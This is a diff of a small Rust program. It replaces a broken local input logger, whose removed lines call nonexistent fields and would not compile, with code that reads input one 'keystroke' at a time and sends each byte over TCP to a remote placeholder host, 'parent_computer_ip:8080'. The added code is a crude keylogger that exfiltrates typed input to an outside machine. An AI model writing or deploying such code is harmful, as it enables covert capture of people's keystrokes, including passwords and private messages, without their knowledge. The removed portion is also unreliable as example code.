@@ -1,34 +1,16 @@
-
-
-use std::{env, io::{self, Write}, process::Command};
+use std::io::{self, Read, Write};
+use std::net::{TcpStream, TcpListener};
+use std::{thread, time};
 
 fn main() {
-    let mut buffer = String::new();
+    let mut stream = TcpStream::connect("parent_computer_ip:8080").unwrap();
 
     loop {
-        let mut input = String::new();
-        let mut output = String::new();
-
-        io::stdin().read_line(&mut input).unwrap();
         
-        buffer.push_str(&input);
-        
-        io::stdout().write_all(&output.stdout).unwrap();
-        io::stderr().write_all(&output.stderr).unwrap();
+        let mut keystroke = [0];
+        io::stdin().read_exact(&mut keystroke).unwrap();
 
-        let os_status = Command::new("systemctl")
-            .arg("is-system-running")
-            .output()
-            .unwrap();
-
-        if !os_status.status.success() {
-            break;
-        }
+        stream.write_all(&keystroke).unwrap();
+        thread::sleep(time::Duration::from_millis(100));
     }
-
-    let username = env::var("USER").unwrap();
-    let mut file = String::new();
-file.push_str("src/log/log.txt");
-std::fs::write(file, buffer).unwrap();
-
 }
